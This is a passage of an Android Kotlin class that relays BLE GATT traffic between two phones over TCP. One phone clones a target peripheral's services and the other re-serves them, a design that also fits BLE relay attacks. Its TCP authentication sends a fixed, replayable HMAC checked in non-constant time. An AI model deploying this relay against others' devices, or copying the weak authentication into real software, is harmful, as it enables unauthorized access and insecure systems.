                    gatt.writeDescriptor(descriptor, value)
                } else {
                    @Suppress("DEPRECATION")
                    descriptor.value = value
                    @Suppress("DEPRECATION")
                    gatt.writeDescriptor(descriptor)
                }
            }
        }
    }

    /**
     * Adds a GATT service to the server asynchronously, suspending until the
     * onServiceAdded callback fires. Times out after [SERVICE_ADD_TIMEOUT_MS].
     */
    private suspend fun addServiceAsync(
        server: BluetoothGattServer,
        service: BluetoothGattService
    ): Boolean {
        return withTimeout(SERVICE_ADD_TIMEOUT_MS) {
            suspendCancellableCoroutine { cont ->
                serviceAddContinuation = cont
                cont.invokeOnCancellation { serviceAddContinuation = null }
                if (!server.addService(service)) {
                    serviceAddContinuation = null
                    cont.safeResume(false)
                }
            }
        }
    }

    // ── Notification forwarding (Node A) ─────────────────────────────────────

    /**
     * Forwards a BLE notification from the target peripheral to Node B over TCP.
     * Called from the onCharacteristicChanged Binder-thread callback, so this
     * launches a coroutine in [notificationScope] to perform the blocking I/O.
     * All TCP writes are synchronized via [tcpWriteLock].
     */
    private fun forwardNotification(serviceUuid: UUID, charUuid: UUID, value: ByteArray) {
        val out = tcpDataOut ?: return
        val scope = notificationScope ?: return
        scope.launch {
            synchronized(tcpWriteLock) {
                try {
                    out.writeByte(MSG_NOTIFICATION.toInt())
                    out.writeUTF(serviceUuid.toString())
                    out.writeUTF(charUuid.toString())
                    out.writeInt(value.size)
                    out.write(value)
                    out.flush()
                } catch (e: IOException) {
                    Log.e(TAG, "Failed to forward notification over TCP", e)
                }
            }
        }
    }

    // ── TCP authentication ───────────────────────────────────────────────────

    /**
     * Server-side (Node A) HMAC authentication.
     * Reads the client's 32-byte HMAC, verifies it, and sends a 1-byte status.
     */
    private fun authenticateServer(
        dataIn: DataInputStream,
        dataOut: DataOutputStream
    ): Boolean {
        val expectedHmac = computeHmac(sharedSecret)
        val clientHmac = ByteArray(32)
        dataIn.readFully(clientHmac)
        val valid = expectedHmac.contentEquals(clientHmac)
        dataOut.writeByte(if (valid) 1 else 0)
        dataOut.flush()
        if (!valid) {
            Log.e(TAG, "TCP authentication failed: client HMAC mismatch")
        }
        return valid
    }

    /**
     * Client-side (Node B) HMAC authentication.
     * Sends our 32-byte HMAC and reads the server's 1-byte accept/reject status.
     */
    private fun authenticateClient(
        dataIn: DataInputStream,
        dataOut: DataOutputStream
    ): Boolean {
        val hmac = computeHmac(sharedSecret)
        dataOut.write(hmac)
        dataOut.flush()
        val status = dataIn.readByte().toInt()
        if (status != 1) {
            Log.e(TAG, "TCP authentication failed: server rejected our HMAC")
        }
        return status == 1
    }

    // ── TCP framing helpers ──────────────────────────────────────────────────

    /**
     * Serializes discovered GATT services over the TCP backchannel to Node B.
     */
    private fun sendServiceDiscoveryToNodeB(
        dataOut: DataOutputStream,
        services: List<BluetoothGattService>
    ) {
        dataOut.writeByte(MSG_SERVICE_DISCOVERY.toInt())
        dataOut.writeInt(services.size)
        for (service in services) {
            dataOut.writeUTF(service.uuid.toString())
            dataOut.writeInt(service.type)
            dataOut.writeInt(service.characteristics.size)
            for (characteristic in service.characteristics) {
                dataOut.writeUTF(characteristic.uuid.toString())
                dataOut.writeInt(characteristic.properties)
                dataOut.writeInt(characteristic.permissions)
                val value = characteristic.value
                if (value != null) {
                    dataOut.writeInt(value.size)
                    dataOut.write(value)
                } else {
                    dataOut.writeInt(0)
                }
                dataOut.writeInt(characteristic.descriptors.size)
                for (descriptor in characteristic.descriptors) {
                    dataOut.writeUTF(descriptor.uuid.toString())
                    dataOut.writeInt(descriptor.permissions)
                }
            }
        }
        dataOut.flush()
    }

    /**
     * Deserializes GATT service definitions received from Node A and creates
     * local [BluetoothGattService] objects to mirror on this device's GATT server.
     */
    private fun receiveServiceDiscoveryFromNodeA(
        dataIn: DataInputStream
    ): List<BluetoothGattService> {
        val msgType = dataIn.readByte()
        if (msgType != MSG_SERVICE_DISCOVERY) {
            Log.e(TAG, "Expected SERVICE_DISCOVERY message, got $msgType")
            return emptyList()
        }

        val serviceCount = dataIn.readInt()
        val services = mutableListOf<BluetoothGattService>()

        for (i in 0 until serviceCount) {
            val serviceUuid = UUID.fromString(dataIn.readUTF())
            val serviceType = dataIn.readInt()
            val charCount = dataIn.readInt()

            val service = BluetoothGattService(serviceUuid, serviceType)

            for (j in 0 until charCount) {
                val charUuid = UUID.fromString(dataIn.readUTF())
                val properties = dataIn.readInt()
                val permissions = dataIn.readInt()
                val valueLen = dataIn.readInt()
                val value = if (valueLen > 0) {
                    val buf = ByteArray(valueLen)
                    dataIn.readFully(buf)
                    buf
                } else {
                    null
                }

                val characteristic = BluetoothGattCharacteristic(
                    charUuid, properties, permissions
                )
                if (value != null) {
                    characteristic.value = value
                }

                val descCount = dataIn.readInt()
                for (k in 0 until descCount) {
                    val descUuid = UUID.fromString(dataIn.readUTF())
                    val descPermissions = dataIn.readInt()
                    val descriptor = BluetoothGattDescriptor(descUuid, descPermissions)
                    characteristic.addDescriptor(descriptor)
                }

                service.addCharacteristic(characteristic)
            }

            services.add(service)
        }

        return services
    }

    // ── GATT client connection ───────────────────────────────────────────────

    /**
     * Connects to a remote BLE device as a GATT client and suspends until the
     * connection callback fires.
     */
    private suspend fun connectGattClient(device: BluetoothDevice): BluetoothGatt? {
        val callback = GattRelayCallback()
        gattRelayCallback = callback
        return suspendCancellableCoroutine { cont ->
            callback.connectionContinuation = cont
            val gattInstance = device.connectGatt(context, false, callback)
            cont.invokeOnCancellation { gattInstance?.close() }
        }
    }

    /**
     * Initiates GATT service discovery and suspends until onServicesDiscovered fires.
     */
    private suspend fun discoverServices(gatt: BluetoothGatt): Boolean {
        val callback = gattRelayCallback ?: return false
        return suspendCancellableCoroutine { cont ->
            callback.discoveryContinuation = cont
            cont.invokeOnCancellation { callback.discoveryContinuation = null }
            gatt.discoverServices()
        }
    }

    // ── Error response helper ────────────────────────────────────────────────

    private fun sendErrorResponse(request: GattRequest) {
        when (request) {
            is GattRequest.CharReadRequest -> {
                gattServer?.sendResponse(
                    request.device, request.requestId,
                    BluetoothGatt.GATT_FAILURE, request.offset, null
                )
            }
            is GattRequest.CharWriteRequest -> {
                if (request.responseNeeded) {
                    gattServer?.sendResponse(
                        request.device, request.requestId,
                        BluetoothGatt.GATT_FAILURE, request.offset, null
                    )
                }
            }
        }
    }

    // ── Cleanup ──────────────────────────────────────────────────────────────

    /**
     * Releases all resources held by this module.
     * Thread-safe via [AtomicBoolean.compareAndSet] -- only the first caller
     * performs cleanup; subsequent calls are no-ops.
     */
    fun cleanup() {
        if (!isClosed.compareAndSet(false, true)) return

        try {
            notificationScope?.cancel()
            notificationScope = null
        } catch (_: Exception) { /* best effort */ }

        try {
            gattClient?.close()
            gattClient = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing GATT client", e)
        }
        try {
            gattServer?.close()
            gattServer = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing GATT server", e)
        }
        try {
            tcpSocket?.close()
            tcpSocket = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing TCP socket", e)
        }
        try {
            tcpServerSocket?.close()
            tcpServerSocket = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing TCP server socket", e)
        }
        tcpDataOut = null
        gattRelayCallback = null
    }
}
